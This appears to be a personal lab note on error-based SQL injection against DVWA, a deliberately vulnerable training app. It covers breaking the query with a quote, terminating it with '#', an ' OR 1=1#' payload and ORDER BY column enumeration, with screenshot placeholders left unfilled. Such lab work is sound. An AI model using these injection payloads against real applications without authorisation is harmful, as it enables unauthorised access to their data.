# Error-based Query SQL Injection

#dvwa #sqli #error-based

Refer to [[Lab Simulation Setup/Webapps/DVWA/Setup#^214bb7|DVWA Lab Setup]] for the attacker machine to map the IP address in the `/etc/hosts`.

## 01 - Vulnerability Detection

### 1.1 - Error Detection

#### 1.1.1 - Break the Query

We will trigger a SQL error using `'` as a prefix to take advantage of unsantized user input.

`<Insert screenshot>`

#### 1.1.2 - Copying the Error Statement

First we breakdown the process step by step to figure it out how join the query to craft our final payload.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

- Understand how the developer sees

```
				   ''1'''    at line 1 (SO THIS IS THE ERROR)
```
- Separate the single quotes

```
(DELETE LEFTHANDSIDE SINGLE QUOTE) ' '1' ' ' (DELETE RIGHTHAND SIDE SINGLE QUOTE)

                                     '1' ' ' (DELETE RIGHTHAND SIDE SINGLE QUOTE)
                                     
                                     '1''
```

- Once you deleted the rest of the quotes

```
                                     '1''    (AFTER ELIMATING THE REST WE HAVE THE REMAINING)
```

- Highlight from the right hand side of the quote

```
                                     '1(')'  (SINGLE QUOTE IS PARENTESIZED, WHICH IS BREAKING THE SQL BACKEND
```

#### 1.1.3 - Joining the Query

^bc051d

Now we need a suffix to terminate to get results. In MySQL we will terminate it with `--` to treat it as a suffix. It will treat it as a comment. We can leverage it to craft the payload to exploit further.

`'--`

`<Insert screenshot>`

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

Looks like it didn't work. Let's instead try adding the `#` as a suffix.

`'#`

`<Insert screenshot>`

We have no errors.

### 1.2 - Craft Payload

This is the syntax with a place holder of SQL payload.

`'<SQL_Payload>#`

`' OR 1=1#`

`<Insert screenshot>`

### 1.3 - Craft Payload

#### 1.3.1 - Columns Enumeration

^f521af

We need to determine number of columns before we perform

```sql
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

`<Insert screenshot ORDER BY 1>`

`<Insert screenshot ORDER BY 3>`

```
Unknown column '3' in 'order clause'
```

3 - 1 = 2

We have two columns.

## References

- [Web Application Pentesting â€“ Manual SQL Injection With Error Based String Method](https://gbhackers.com/manual-sql-injection/)

- [Acunetix: SQLi - How it works](https://www.acunetix.com/blog/articles/sqli-how-it-works/)